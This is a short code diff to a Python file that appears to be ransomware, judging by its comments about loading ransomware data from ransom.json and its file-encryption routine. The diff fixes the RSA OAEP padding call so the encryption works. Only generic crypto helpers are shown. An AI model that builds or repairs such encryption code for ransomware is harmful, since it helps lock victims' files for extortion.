@@ -8,6 +8,7 @@ from cryptography.hazmat.primitives.asymmetric.padding import OAEP
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
+from cryptography.hazmat.primitives.asymmetric import padding
 
 # Load ransomware information from ransom.json
 def load_ransomware_data():
@@ -48,7 +49,14 @@ def rc4_encrypt(data, key):
 
 # RSA Encryption
 def rsa_encrypt(data, public_key):
-    return public_key.encrypt(data, OAEP(mgf=OAEP.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
+    return public_key.encrypt(
+        data,
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
 
 # Encrypt file based on encryption type
 def encrypt_file(file_path, enc_type, enc_algo, key=None, rsa_key=None):
